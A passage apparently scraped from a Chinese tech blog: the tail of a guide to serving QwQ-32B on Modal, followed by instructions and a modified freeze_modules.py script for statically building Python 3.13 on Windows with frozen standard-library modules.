@modal.fastapi_endpoint(method="POST")
def get(question: Dict):
    from fastapi.responses import StreamingResponse
    from itertools import chain
    from fastapi.responses import JSONResponse
    model = qwq()
    return StreamingResponse(
            model.generate.remote_gen(question["messages"]),
        media_type="text/event-stream",
    )
32B模型需要L4显卡才能以正常速度运行
可以修改scaledown_window的大小来调整无对话多长时间后关闭容器
因平台限制自写后端，比较繁琐

然后运行：
text1 linecopymodal deploy qwq.py
此时去网站上找调用api的地址，然后可以按照openai的api格式进行调用
这里提供一个我已经搭建好的玩具：QwQ-32B↗
容器冷启动需要时间，所以当第一次对话或是60秒之内无对话需要等待容器启动加载模型`,"424j6n5w":`本文依据python3.13.2+编写

前往python/cpython: The Python programming language↗下载python源码，解压
进入PCbuild文件夹，运行get_externals.bat下载依赖（可能需要魔法）
下载完依赖后使用VS打开pcbuild.sln，将配置由Debug改为Release（确保此时是x64 Release），在解决方案资源管理器中选中Python，右键生成
此时PCbuild文件夹下生成amd64文件夹
在解决方案资源管理器中找到pythoncore，右键属性，配置选择Release，平台选择x64，配置属性-->常规-->配置类型由动态库(.dll)改为静态库(.lib)
C/C++-->预处理器-->预处理器定义点击编辑，取消继承，并修改定义为
text9 linescopy_Py_HAVE_ZLIB
_USRDLL
Py_BUILD_CORE
Py_BUILD_CORE_BUILTIN
Py_NO_ENABLE_SHARED
MS_DLL_ID="$(SysWinVer)"
WIN32
$(_Py3NamePreprocessorDefinition)
$(_PlatformPreprocessorDefinition)$(_DebugPreprocessorDefinition)$(_PydPreprocessorDefinition)_WINDLL
C/C++-->代码生成-->运行库修改为多线程（/MT）
应用上述pythoncore的修改
在解决方案资源管理器中找到Python，右键属性，配置选择Release，平台选择x64，
C/C++-->预处理器-->预处理器定义点击编辑，不要取消继承，并修改定义为
text3 linescopyPy_BUILD_CORE
_CONSOLE
Py_NO_ENABLE_SHARED
C/C++-->代码生成-->运行库修改为多线程（/MT）
链接器-->输入-->附加依赖项添加
text4 linescopybcrypt.lib
version.lib
ws2_32.lib
pathcch.lib
应用上述python的修改
打开Lib/site.py，寻找sys.winver.replace('.', '')修改为"3.13".replace('.', '')（3.13修改为你编译的python版本）
打开Lib/_pyrepl/__main.py__，在文件的开头加上
python2 linescopy__package__ = &#x27;_pyrepl&#x27;
__path__ = [__name__]
打开Tools/build/freeze_modules.py
将整个文件内容替换为下面的代码
python906 linescopy"""Freeze modules and regen related files (e.g. Python/frozen.c).

See the notes at the top of Python/frozen.c for more info.
"""
import subprocess

from collections import namedtuple
import hashlib
import os
import ntpath
import posixpath
import argparse
from update_file import updating_file_with_tmpfile
# 定义冻结模块数据结构
FrozenModule1 = namedtuple(&#x27;FrozenModule&#x27;, [
    &#x27;fullname&#x27;,      # 完整模块名（如"encodings.utf_8"）
    &#x27;py_path&#x27;,       # 源文件路径（如"Lib/encodings/utf_8.py"）
    &#x27;h_path&#x27;,        # 生成的头文件路径（如"Python/frozen_modules/encodings/utf_8.h"）
    &#x27;c_path&#x27;,        # 生成的C文件路径（如"Python/frozen_modules/encodings/utf_8.c"）
    &#x27;is_package&#x27;     # 是否为包目录
])
def find_python_modules(root_dir):
    """
    递归查找所有Python模块
    返回生成器：FrozenModule对象
    """
    lib_dir = os.path.join(root_dir, &#x27;Lib&#x27;)
    frozen_dir = os.path.join(root_dir, &#x27;Python&#x27;, &#x27;frozen_modules&#x27;)

    for root, dirs, files in os.walk(lib_dir):
        # 计算模块相对路径（相对于Lib目录）
        rel_path = os.path.relpath(root, lib_dir)
        if rel_path == ".":
            namespace_parts = []
        else:
            namespace_parts = rel_path.split(os.sep)

        # 处理包目录（包含__init__.py）
        if &#x27;__init__.py&#x27; in files:
            pkg_name = ".".join(namespace_parts) if namespace_parts else ""
            
            # 生成包自身的模块信息（不要__init__.h）
            yield FrozenModule1(
                fullname=pkg_name,
                py_path=os.path.join(root, &#x27;__init__.py&#x27;),
                h_path=os.path.join(frozen_dir, f"{pkg_name}.h") if pkg_name else "",
                c_path=os.path.join(frozen_dir, f"{pkg_name}.c") if pkg_name else "",
                is_package=True
            )

            # 处理包内所有子模块
            for f in files:
                if f.endswith(&#x27;.py&#x27;) and f != &#x27;__init__.py&#x27;:
                    mod_name = f[:-3]
                    full_name = f"{pkg_name}.{mod_name}" if pkg_name else mod_name
                    yield FrozenModule1(
                        fullname=full_name,
                        py_path=os.path.join(root, f),
                        h_path=os.path.join(frozen_dir, f"{full_name}.h"),
                        c_path=os.path.join(frozen_dir, f"{full_name}.c"),
                        is_package=False
                    )

        # 处理非包普通模块（仅限Lib根目录）
        elif root == lib_dir:
            for f in files:
                if f.endswith(&#x27;.py&#x27;):
                    mod_name = f[:-3]
                    yield FrozenModule1(
                        fullname=mod_name,
                        py_path=os.path.join(root, f),
                        h_path=os.path.join(frozen_dir, f"{mod_name}.h"),
                        c_path=os.path.join(frozen_dir, f"{mod_name}.c"),
                        is_package=False
                    )

def load_auto_frozen():
    filenames = []
    
    for root, dirs, files in os.walk(os.path.join(ROOT_DIR, &#x27;Python&#x27;, &#x27;frozen_modules&#x27;)):
        for file in files:
            if file.endswith(&#x27;.h&#x27;):
                # 分离文件名和扩展名
                name_without_ext = os.path.splitext(file)[0]
                filenames.append(name_without_ext)
    print(filenames)
    return filenames

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
ROOT_DIR = os.path.abspath(ROOT_DIR)
FROZEN_ONLY = os.path.join(ROOT_DIR, &#x27;Tools&#x27;, &#x27;freeze&#x27;, &#x27;flag.py&#x27;)

STDLIB_DIR = os.path.join(ROOT_DIR, &#x27;Lib&#x27;)
# If FROZEN_MODULES_DIR or DEEPFROZEN_MODULES_DIR is changed then the
# .gitattributes and .gitignore files needs to be updated.
FROZEN_MODULES_DIR = os.path.join(ROOT_DIR, &#x27;Python&#x27;, &#x27;frozen_modules&#x27;)

FROZEN_FILE = os.path.join(ROOT_DIR, &#x27;Python&#x27;, &#x27;frozen.c&#x27;)
MAKEFILE = os.path.join(ROOT_DIR, &#x27;Makefile.pre.in&#x27;)
PCBUILD_PROJECT = os.path.join(ROOT_DIR, &#x27;PCbuild&#x27;, &#x27;_freeze_module.vcxproj&#x27;)
PCBUILD_FILTERS = os.path.join(ROOT_DIR, &#x27;PCbuild&#x27;, &#x27;_freeze_module.vcxproj.filters&#x27;)
PCBUILD_PYTHONCORE = os.path.join(ROOT_DIR, &#x27;PCbuild&#x27;, &#x27;pythoncore.vcxproj&#x27;)

FREEZE_MODULE_EXE = os.path.join(ROOT_DIR, &#x27;PCbuild&#x27;, &#x27;amd64&#x27;, &#x27;_freeze_module.exe&#x27;)

OS_PATH = &#x27;ntpath&#x27; if os.name == &#x27;nt&#x27; else &#x27;posixpath&#x27;

# These are modules that get frozen.
# If you&#x27;re debugging new bytecode instructions,
# you can delete all sections except &#x27;import system&#x27;.
# This also speeds up building somewhat.
TESTS_SECTION = &#x27;Test module&#x27;
FROZEN = [
    # See parse_frozen_spec() for the format.
    # In cases where the frozenid is duplicated, the first one is re-used.
    (&#x27;import system&#x27;, [
        *load_auto_frozen(),
        # These frozen modules are necessary for bootstrapping
        # the import system.
        &#x27;importlib._bootstrap : _frozen_importlib&#x27;,
        &#x27;importlib._bootstrap_external : _frozen_importlib_external&#x27;,
        # This module is important because some Python builds rely
        # on a builtin zip file instead of a filesystem.
        &#x27;zipimport&#x27;,
        ]),
    # (You can delete entries from here down to the end of the list.)
    (&#x27;stdlib - startup, without site (python -S)&#x27;, [
        &#x27;abc&#x27;,
        &#x27;codecs&#x27;,
        # For now we do not freeze the encodings, due # to the noise all
        # those extra modules add to the text printed during the build.
        # (See https://github.com/python/cpython/pull/28398#pullrequestreview-756856469.)
        #&#x27;<encodings.*>&#x27;,
        &#x27;io&#x27;,
        ]),
    (&#x27;stdlib - startup, with site&#x27;, [
        &#x27;_collections_abc&#x27;,
        &#x27;_sitebuiltins&#x27;,
        &#x27;genericpath&#x27;,
        &#x27;ntpath&#x27;,
        &#x27;posixpath&#x27;,
        # We must explicitly mark os.path as a frozen module
        # even though it will never be imported.
        f&#x27;{OS_PATH} : os.path&#x27;,
        &#x27;os&#x27;,
        &#x27;site&#x27;,
        &#x27;stat&#x27;,
        ]),
    (&#x27;runpy - run module with -m&#x27;, [
        "importlib.util",
        "importlib.machinery",
        "runpy",
    ]),
    (TESTS_SECTION, [
        
        &#x27;__hello__&#x27;,
        &#x27;__hello__ : __hello_alias__&#x27;,
        &#x27;__hello__ : <__phello_alias__>&#x27;,
        &#x27;__hello__ : __phello_alias__.spam&#x27;,
        ]),
    # (End of stuff you could delete.)
]
BOOTSTRAP = {
    &#x27;importlib._bootstrap&#x27;,
    &#x27;importlib._bootstrap_external&#x27;,
    &#x27;zipimport&#x27;,
}

import os
import subprocess
from collections import namedtuple
import shutil

def generate_frozen_files(root_dir):
    """
    核心生成函数
    """
    # 清理旧文件
    frozen_dir = os.path.join(root_dir, &#x27;Python&#x27;, &#x27;frozen_modules&#x27;)
    if os.path.exists(frozen_dir):
        shutil.rmtree(frozen_dir)
    
    # 创建冻结工具路径
    freeze_tool = os.path.join(root_dir, &#x27;PCbuild&#x27;, &#x27;amd64&#x27;, &#x27;_freeze_module.exe&#x27;)
    
    # 遍历所有模块
    for module in find_python_modules(root_dir):
        if(module.fullname.startswith(&#x27;test&#x27;)==False):
            # 创建目标目录
            os.makedirs(os.path.dirname(module.h_path), exist_ok=True)
            
            # 构建命令行参数
            cmd = [
                freeze_tool,
                module.fullname,
                module.py_path,
                module.h_path,
            ]
            
            print(f"冻结命令: {&#x27; &#x27;.join(cmd)}")
            # 执行冻结命令
            try:
                if(module.is_package):
                    with open(module.py_path, &#x27;rb&#x27;) as f:
                        content = f.read()
                    
                    bom = b&#x27;&#x27;
                    newline = b&#x27;\\n&#x27;  # 默认换行符
                    insert_pos = 0
                    
                    # 处理 BOM（UTF-8 文件头）
                    if content.startswith(b&#x27;\\xef\\xbb\\xbf&#x27;):
                        bom = content[:3]
                        content = content[3:]
                    
                    # 分割行并保留换行符
                    lines = content.splitlines(keepends=True)
                    
                    # 寻找第一个非空行
                    first_non_empty_idx = None
                    for idx, line in enumerate(lines):
                        if line.strip():  # 检查是否非空行
                            first_non_empty_idx = idx
                            # 检测换行符类型（优先使用第一个非空行的换行符）
                            if line.endswith(b&#x27;\\r\\n&#x27;):
                                newline = b&#x27;\\r\\n&#x27;
                            elif line.endswith(b&#x27;\\n&#x27;):
                                newline = b&#x27;\\n&#x27;
                            break
                    
                    # 生成要插入的字节内容
                    new_lines = [
                        f"__package__ = &#x27;{module.fullname}&#x27;\\n".encode(&#x27;utf-8&#x27;) + newline,
                        "__path__ = [__name__]\\n".encode(&#x27;utf-8&#x27;) + newline
                    ]
                    
                    # 判断插入位置
                    if first_non_empty_idx is not None:
                        target_line = lines[first_non_empty_idx]
                        # 检查是否以 from __future__ 开头（允许前导空格）
                        if target_line.lstrip().startswith(b&#x27;from __future__&#x27;):
                            insert_pos = first_non_empty_idx + 1
                        else:
                            insert_pos = 0
                    else:
                        # 整个文件都是空行，直接在开头插入
                        insert_pos = 0
                    
                    # 插入新内容
                    if insert_pos == 0:
                        # 在开头插入（BOM之后）
                        lines = new_lines + lines
                    else:
                        # 在指定位置插入
                        lines[insert_pos:insert_pos] = new_lines
                    
                    # 重建内容并保留BOM
                    new_content = bom + b&#x27;&#x27;.join(lines)
                    
                    # 写回文件
                    with open(module.py_path, &#x27;wb&#x27;) as f:
                        f.write(new_content)
                    #with open(module.py_path, &#x27;rb+&#x27;) as f:
                    #    old = f.read()
                    #    f.seek(0)
                    #    f.write(old)
                    #    f.write(f"__package__ = &#x27;{module.fullname}&#x27;\\n".encode("utf-8"))
                    #    f.write("__path__ = [__name__]\\n".encode("utf-8"))
                        
                result = subprocess.run(
                    cmd,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding=&#x27;utf-8&#x27;,
                    cwd=root_dir
                )
                print(f"成功冻结: {module.fullname}")
                print(f"生成文件: {module.h_path}")
                print(f"          {module.c_path}")
                
            except subprocess.CalledProcessError as e:
                print(f"冻结失败: {module.fullname}")
                print("错误输出:")
                print(e.stdout)

#######################################
# platform-specific helpers

if os.path is posixpath:
    relpath_for_posix_display = os.path.relpath

    def relpath_for_windows_display(path, base):
        return ntpath.relpath(
            ntpath.join(*path.split(os.path.sep)),
            ntpath.join(*base.split(os.path.sep)),
        )

else:
    relpath_for_windows_display = ntpath.relpath

    def relpath_for_posix_display(path, base):
        return posixpath.relpath(
            posixpath.join(*path.split(os.path.sep)),
            posixpath.join(*base.split(os.path.sep)),
        )

#######################################
# specs

def parse_frozen_specs():
    seen = {}
    for section, specs in FROZEN:
        parsed = _parse_specs(specs, section, seen)
        for item in parsed:
            frozenid, pyfile, modname, ispkg, section = item
            try:
                source = seen[frozenid]
            except KeyError:
                source = FrozenSource.from_id(frozenid, pyfile)
                seen[frozenid] = source
            else:
                assert not pyfile or pyfile == source.pyfile, item
            yield FrozenModule(modname, ispkg, section, source)

def _parse_specs(specs, section, seen):
    for spec in specs:
        info, subs = _parse_spec(spec, seen, section)
        yield info
        for info in subs or ():
            yield info

def _parse_spec(spec, knownids=None, section=None):
    """Yield an info tuple for each module corresponding to the given spec.

    The info consists of: (frozenid, pyfile, modname, ispkg, section).

    Supported formats:

      frozenid
      frozenid : modname
      frozenid : modname = pyfile

    "frozenid" and "modname" must be valid module names (dot-separated
    identifiers).  If "modname" is not provided then "frozenid" is used.
    If "pyfile" is not provided then the filename of the module
    corresponding to "frozenid" is used.

    Angle brackets around a frozenid (e.g. &#x27;<encodings>") indicate
    it is a package.  This also means it must be an actual module
    (i.e. "pyfile" cannot have been provided).  Such values can have
    patterns to expand submodules:

      <encodings.*>    - also freeze all direct submodules
      <encodings.**.*> - also freeze the full submodule tree

    As with "frozenid", angle brackets around "modname" indicate
    it is a package.  However, in this case "pyfile" should not
    have been provided and patterns in "modname" are not supported.
    Also, if "modname" has brackets then "frozenid" should not,
    and "pyfile" should have been provided..
    """
    frozenid, _, remainder = spec.partition(&#x27;:&#x27;)
    modname, _, pyfile = remainder.partition(&#x27;=&#x27;)
    frozenid = frozenid.strip()
    modname = modname.strip()
    pyfile = pyfile.strip()

    submodules = None
    if modname.startswith(&#x27;<&#x27;) and modname.endswith(&#x27;>&#x27;):
        assert check_modname(frozenid), spec
        modname = modname[1:-1]
        assert check_modname(modname), spec
        if frozenid in knownids:
            pass
        elif pyfile:
            assert not os.path.isdir(pyfile), spec
        else:
            pyfile = _resolve_module(frozenid, ispkg=False)
        ispkg = True
    elif pyfile:
        assert check_modname(frozenid), spec
        assert not knownids or frozenid not in knownids, spec
        assert check_modname(modname), spec
        assert not os.path.isdir(pyfile), spec
        ispkg = False
    elif knownids and frozenid in knownids:
        assert check_modname(frozenid), spec
        #assert check_modname(modname), spec
        ispkg = False
    else:
        assert not modname or check_modname(modname), spec
        resolved = iter(resolve_modules(frozenid))
        frozenid, pyfile, ispkg = next(resolved)
        if not modname:
            modname = frozenid
        if ispkg:
            pkgid = frozenid
            pkgname = modname
            pkgfiles = {pyfile: pkgid}
            def iter_subs():
                for frozenid, pyfile, ispkg in resolved:
                    if pkgname:
                        modname = frozenid.replace(pkgid, pkgname, 1)
                    else:
                        modname = frozenid
                    if pyfile:
                        if pyfile in pkgfiles:
                            frozenid = pkgfiles[pyfile]
                            pyfile = None
                        elif ispkg:
                            pkgfiles[pyfile] = frozenid
                    yield frozenid, pyfile, modname, ispkg, section
            submodules = iter_subs()

    info = (frozenid, pyfile or None, modname, ispkg, section)
    return info, submodules

#######################################
# frozen source files

class FrozenSource(namedtuple(&#x27;FrozenSource&#x27;, &#x27;id pyfile frozenfile&#x27;)):

    @classmethod
    def from_id(cls, frozenid, pyfile=None):
        if not pyfile:
            pyfile = os.path.join(STDLIB_DIR, *frozenid.split(&#x27;.&#x27;)) + &#x27;.py&#x27;
            #assert os.path.exists(pyfile), (frozenid, pyfile)
        #print(frozenid)
        frozenfile = resolve_frozen_file(frozenid, FROZEN_MODULES_DIR)
        return cls(frozenid, pyfile, frozenfile)

    @property
    def frozenid(self):
        return self.id

    @property
    def modname(self):
        if self.pyfile.startswith(STDLIB_DIR):
            return self.id
        return None

    @property
    def symbol(self):
        # This matches what we do in Programs/_freeze_module.c:
        name = self.frozenid.replace(&#x27;.&#x27;, &#x27;_&#x27;)
        return &#x27;_Py_M__&#x27; + name

    @property
    def ispkg(self):
        if not self.pyfile:
            return False
        elif self.frozenid.endswith(&#x27;.__init__&#x27;):
            return False
        else:
            return os.path.basename(self.pyfile) == &#x27;__init__.py&#x27;

    @property
    def isbootstrap(self):
        return self.id in BOOTSTRAP

def resolve_frozen_file(frozenid, destdir):
    """Return the filename corresponding to the given frozen ID.

    For stdlib modules the ID will always be the full name
    of the source module.
    """
    if not isinstance(frozenid, str):
        try:
            frozenid = frozenid.frozenid
        except AttributeError:
            raise ValueError(f&#x27;unsupported frozenid {frozenid!r}&#x27;)
    # We use a consistent naming convention for all frozen modules.
    frozenfile = f&#x27;{frozenid}.h&#x27;
    if not destdir:
        return frozenfile
    return os.path.join(destdir, frozenfile)

#######################################
# frozen modules

class FrozenModule(namedtuple(&#x27;FrozenModule&#x27;, &#x27;name ispkg section source&#x27;)):

    def __getattr__(self, name):
        return getattr(self.source, name)

    @property
    def modname(self):
        return self.name

    @property
    def orig(self):
        return self.source.modname

    @property
    def isalias(self):
        orig = self.source.modname
        if not orig:
            return True
        return self.name != orig

    def summarize(self):
        source = self.source.modname
        if source:
            source = f&#x27;<{source}>&#x27;
        else:
            source = relpath_for_posix_display(self.pyfile, ROOT_DIR)
        return {
            &#x27;module&#x27;: self.name,
            &#x27;ispkg&#x27;: self.ispkg,
            &#x27;source&#x27;: source,
            &#x27;frozen&#x27;: os.path.basename(self.frozenfile),
            &#x27;checksum&#x27;: _get_checksum(self.frozenfile),
        }

def _iter_sources(modules):
    seen = set()
    for mod in modules:
        if mod.source not in seen:
            yield mod.source
            seen.add(mod.source)

#######################################
# generic helpers

def _get_checksum(filename):
    with open(filename, "rb") as infile:
        contents = infile.read()
    m = hashlib.sha256()
    m.update(contents)
    return m.hexdigest()

def resolve_modules(modname, pyfile=None):
    """自动识别包目录和普通模块"""
    # 自动检测包结构
    if not pyfile:
        pyfile = _resolve_module(modname, ispkg=False)
        if os.path.isdir(pyfile):
            pyfile = os.path.join(pyfile, &#x27;__init__.py&#x27;)
    
    ispkg = False
    # 检查是否为包
    if os.path.basename(pyfile) == &#x27;__init__.py&#x27;:
        ispkg = True
        actual_path = os.path.dirname(pyfile)
    else:
        actual_path = pyfile
    
    # 处理包目录的递归发现
    if os.path.isdir(actual_path):
        ispkg = True
        yield from _find_package_modules(modname, actual_path)
    else:
        yield modname, pyfile, ispkg

def _find_package_modules(pkgname, pkgdir):
    """递归发现包内所有子模块"""
    yield pkgname, os.path.join(pkgdir, &#x27;__init__.py&#x27;), True
    
    for root, dirs, files in os.walk(pkgdir):
        rel_path = os.path.relpath(root, pkgdir).replace(os.sep, &#x27;.&#x27;)
        if rel_path == &#x27;.&#x27;:
            rel_path = &#x27;&#x27;
        
        for f in files:
            if f.endswith(&#x27;.py&#x27;) and f != &#x27;__init__.py&#x27;:
                modname = f&#x27;{pkgname}.{rel_path}.{f[:-3]}&#x27; if rel_path else f&#x27;{pkgname}.{f[:-3]}&#x27;
                yield modname, os.path.join(root, f), False
        
        for d in dirs:
            subdir = os.path.join(root, d)
            if os.path.exists(os.path.join(subdir, &#x27;__init__.py&#x27;)):
                submod = f&#x27;{pkgname}.{rel_path}.{d}&#x27; if rel_path else f&#x27;{pkgname}.{d}&#x27;
                yield from _find_package_modules(submod, subdir)

def check_modname(modname):
    print(modname)
    return all(n.isidentifier() for n in modname.split(&#x27;.&#x27;))

def iter_submodules(pkgname, pkgdir=None, match=&#x27;*&#x27;):
    if not pkgdir:
        pkgdir = os.path.join(STDLIB_DIR, *pkgname.split(&#x27;.&#x27;))
    if not match:
        match = &#x27;**.*&#x27;
    match_modname = _resolve_modname_matcher(match, pkgdir)

    def _iter_submodules(pkgname, pkgdir):
        for entry in sorted(os.scandir(pkgdir), key=lambda e: e.name):
            matched, recursive = match_modname(entry.name)
            if not matched:
                continue
            modname = f&#x27;{pkgname}.{entry.name}&#x27;
            if modname.endswith(&#x27;.py&#x27;):
                yield modname[:-3], entry.path, False
            elif entry.is_dir():
                pyfile = os.path.join(entry.path, &#x27;__init__.py&#x27;)
                # We ignore namespace packages.
                if os.path.exists(pyfile):
                    yield modname, pyfile, True
                    if recursive:
                        yield from _iter_submodules(modname, entry.path)

    return _iter_submodules(pkgname, pkgdir)

def _resolve_modname_matcher(match, rootdir=None):
    if isinstance(match, str):
        if match.startswith(&#x27;**.&#x27;):
            recursive = True
            pat = match[3:]
            assert match
        else:
            recursive = False
            pat = match

        if pat == &#x27;*&#x27;:
            def match_modname(modname):
                return True, recursive
        else:
            raise NotImplementedError(match)
    elif callable(match):
        match_modname = match(rootdir)
    else:
        raise ValueError(f&#x27;unsupported matcher {match!r}&#x27;)
    return match_modname

def _resolve_module(modname, pathentry=STDLIB_DIR, ispkg=False):
    assert pathentry, pathentry
    pathentry = os.path.normpath(pathentry)
    assert os.path.isabs(pathentry)
    if ispkg:
        return os.path.join(pathentry, *modname.split(&#x27;.&#x27;), &#x27;__init__.py&#x27;)
    return os.path.join(pathentry, *modname.split(&#x27;.&#x27;)) + &#x27;.py&#x27;

#######################################
# regenerating dependent files

def find_marker(lines, marker, file):
    for pos, line in enumerate(lines):
        if marker in line:
            return pos
    raise Exception(f"Can&#x27;t find {marker!r} in file {file}")

def replace_block(lines, start_marker, end_marker, replacements, file):
    start_pos = find_marker(lines, start_marker, file)
    end_pos = find_marker(lines, end_marker, file)
    if end_pos <= start_pos:
        raise Exception(f"End marker {end_marker!r} "
                        f"occurs before start marker {start_marker!r} "
                        f"in file {file}")
    replacements = [line.rstrip() + &#x27;\\n&#x27; for line in replacements]
    return lines[:start_pos + 1] + replacements + lines[end_pos:]

class UniqueList(list):
    def __init__(self):
        self._seen = set()

    def append(self, item):
        if item in self._seen:
            return
        super().append(item)
        self._seen.add(item)

def regen_frozen(modules):
    headerlines = []
    parentdir = os.path.dirname(FROZEN_FILE)
    for src in _iter_sources(modules):
        # Adding a comment to separate sections here doesn&#x27;t add much,
        # so we don&#x27;t.
        header = relpath_for_posix_display(src.frozenfile, parentdir)
        headerlines.append(f&#x27;#include "{header}"&#x27;)

    externlines = UniqueList()
    bootstraplines = []
    stdliblines = []
    testlines = []
    aliaslines = []
    indent = &#x27;    &#x27;
    lastsection = None
    for mod in modules:
        if mod.isbootstrap:
            lines = bootstraplines
        elif mod.section == TESTS_SECTION:
            lines = testlines
        else:
            lines = stdliblines
            if mod.section != lastsection:
                if lastsection is not None:
                    lines.append(&#x27;&#x27;)
                lines.append(f&#x27;/* {mod.section} */&#x27;)
            lastsection = mod.section

        pkg = &#x27;true&#x27; if mod.ispkg else &#x27;false&#x27;
        size = f"(int)sizeof({mod.symbol})"
        line = f&#x27;{{"{mod.name}", {mod.symbol}, {size}, {pkg}}},&#x27;
        lines.append(line)

        if mod.isalias:
            if not mod.orig:
                entry = &#x27;{"%s", NULL},&#x27; % (mod.name,)
            elif mod.source.ispkg:
                entry = &#x27;{"%s", "<%s"},&#x27; % (mod.name, mod.orig)
            else:
                entry = &#x27;{"%s", "%s"},&#x27; % (mod.name, mod.orig)
            aliaslines.append(indent + entry)

    for lines in (bootstraplines, stdliblines, testlines):
        # TODO: Is this necessary any more?
        if lines and not lines[0]:
            del lines[0]
        for i, line in enumerate(lines):
            if line:
                lines[i] = indent + line

    print(f&#x27;# Updating {os.path.relpath(FROZEN_FILE)}&#x27;)
    with updating_file_with_tmpfile(FROZEN_FILE) as (infile, outfile):
        lines = infile.readlines()
        # TODO: Use more obvious markers, e.g.
        # $START GENERATED FOOBAR$ / $END GENERATED FOOBAR$
        lines = replace_block(
            lines,
            "/* Includes for frozen modules: */",
            "/* End includes */",
            headerlines,
            FROZEN_FILE,
        )
        lines = replace_block(
            lines,
            "static const struct _frozen bootstrap_modules[] =",
            "/* bootstrap sentinel */",
            bootstraplines,
            FROZEN_FILE,
        )
        lines = replace_block(
            lines,
            "static const struct _frozen stdlib_modules[] =",
            "/* stdlib sentinel */",
            stdliblines,
            FROZEN_FILE,
        )
        lines = replace_block(
            lines,
            "static const struct _frozen test_modules[] =",
            "/* test sentinel */",
            testlines,
            FROZEN_FILE,
        )
        lines = replace_block(
            lines,
            "const struct _module_alias aliases[] =",
            "/* aliases sentinel */",
            aliaslines,
            FROZEN_FILE,
        )
        outfile.writelines(lines)

def regen_makefile(modules):
    pyfiles = []
    frozenfiles = []
    rules = [&#x27;&#x27;]
    for src in _iter_sources(modules):
        frozen_header = relpath_for_posix_display(src.frozenfile, ROOT_DIR)
        frozenfiles.append(f&#x27;\\t\\t{frozen_header} \\\\&#x27;)
        #print(frozen_header)
        pyfile = relpath_for_posix_display(src.pyfile, ROOT_DIR)
        pyfiles.append(f&#x27;\\t\\t{pyfile} \\\\&#x27;)

        if src.isbootstrap:
            freezecmd = &#x27;$(FREEZE_MODULE_BOOTSTRAP)&#x27;
            freezedep = &#x27;$(FREEZE_MODULE_BOOTSTRAP_DEPS)&#x27;
        else:
            freezecmd = &#x27;$(FREEZE_MODULE)&#x27;
            freezedep = &#x27;$(FREEZE_MODULE_DEPS)&#x27;

        freeze = (f&#x27;{freezecmd} {src.frozenid} &#x27;
                    f&#x27;$(srcdir)/{pyfile} {frozen_header}&#x27;)
        rules.extend([
            f&#x27;{frozen_header}: {pyfile} {freezedep}&#x27;,
            f&#x27;\\t{freeze}&#x27;,
            &#x27;&#x27;,
        ])
    pyfiles[-1] = pyfiles[-1].rstrip(" \\\\")
    frozenfiles[-1] = frozenfiles[-1].rstrip(" \\\\")

    print(f&#x27;# Updating {os.path.relpath(MAKEFILE)}&#x27;)
    with updating_file_with_tmpfile(MAKEFILE) as (infile, outfile):
        lines = infile.readlines()
        lines = replace_block(
            lines,
            "FROZEN_FILES_IN =",
            "# End FROZEN_FILES_IN",
            pyfiles,
            MAKEFILE,
        )
        lines = replace_block(
            lines,
            "FROZEN_FILES_OUT =",
            "# End FROZEN_FILES_OUT",
            frozenfiles,
            MAKEFILE,
        )
        lines = replace_block(
            lines,
            "# BEGIN: freezing modules",
            "# END: freezing modules",
            rules,
            MAKEFILE,
        )
        outfile.writelines(lines)

def regen_pcbuild(modules):
    projlines = []
    filterlines = []
    corelines = []
    for src in _iter_sources(modules):
        pyfile = relpath_for_windows_display(src.pyfile, ROOT_DIR)
        header = relpath_for_windows_display(src.frozenfile, ROOT_DIR)
        intfile = ntpath.splitext(ntpath.basename(header))[0] + &#x27;.g.h&#x27;
        projlines.append(f&#x27;    <None Include="..\\\\{pyfile}">&#x27;)
        projlines.append(f&#x27;      <ModName>{src.frozenid}</ModName>&#x27;)
        projlines.append(f&#x27;      <IntFile>$(IntDir){intfile}</IntFile>&#x27;)
        projlines.append(f&#x27;      <OutFile>$(GeneratedFrozenModulesDir){header}</OutFile>&#x27;)
        projlines.append(f&#x27;    </None>&#x27;)

        filterlines.append(f&#x27;    <None Include="..\\\\{pyfile}">&#x27;)
        filterlines.append(&#x27;      <Filter>Python Files</Filter>&#x27;)
        filterlines.append(&#x27;    </None>&#x27;)

    print(f&#x27;# Updating {os.path.relpath(PCBUILD_PROJECT)}&#x27;)
    with updating_file_with_tmpfile(PCBUILD_PROJECT) as (infile, outfile):
        lines = infile.readlines()
        lines = replace_block(
            lines,
            &#x27;<!-- BEGIN frozen modules -->&#x27;,
            &#x27;<!-- END frozen modules -->&#x27;,
            projlines,
            PCBUILD_PROJECT,
        )
        outfile.writelines(lines)
    print(f&#x27;# Updating {os.path.relpath(PCBUILD_FILTERS)}&#x27;)
    with updating_file_with_tmpfile(PCBUILD_FILTERS) as (infile, outfile):
        lines = infile.readlines()
        lines = replace_block(
            lines,
            &#x27;<!-- BEGIN frozen modules -->&#x27;,
            &#x27;<!-- END frozen modules -->&#x27;,
            filterlines,
            PCBUILD_FILTERS,
        )
        outfile.writelines(lines)

#######################################
# the script

def main():
    parser = argparse.ArgumentParser()
    #generate_frozen_files(ROOT_DIR)
    # Expand the raw specs, preserving order.
    modules = list(parse_frozen_specs())
    parser.add_argument(&#x27;--step&#x27;, type=int, default=0)
    args = parser.parse_args()
    if args.step == 0:
        # Freeze the modules.
        generate_frozen_files(ROOT_DIR)
    elif args.step == 1:
        # Regen build-related files.
        regen_makefile(modules)
        regen_pcbuild(modules)
        regen_frozen(modules)
    # Regen build-related files.
    #regen_makefile(modules)
    #regen_pcbuild(modules)
    #regen_frozen(modules)
    

if __name__ == &#x27;__main__&#x27;:
    main()

打开Tools/build/update_file.py
将整个文件内容替换为下面的代码
python93 linescopy"""
A script that replaces an old file with a new one, only if the contents
actually changed.  If not, the new file is simply deleted.

This avoids wholesale rebuilds when a code (re)generation phase does not
actually change the in-tree generated code.
"""

import contextlib
import os
import os.path
import sys

@contextlib.contextmanager
def updating_file_with_tmpfile(filename, tmpfile=None):
    """A context manager for updating a file via a temp file.

    The context manager provides two open files: the source file open
    for reading, and the temp file, open for writing.

    Upon exiting: both files are closed, and the source file is replaced
    with the temp file.
    """
    # XXX Optionally use tempfile.TemporaryFile?
    if not tmpfile:
        tmpfile = filename + &#x27;.tmp&#x27;
    elif os.path.isdir(tmpfile):
        tmpfile = os.path.join(tmpfile, filename + &#x27;.tmp&#x27;)

    with open(filename, &#x27;rb&#x27;) as infile:
        line = infile.readline()

    if line.endswith(b&#x27;\\r\\n&#x27;):
        newline = "\\r\\n"
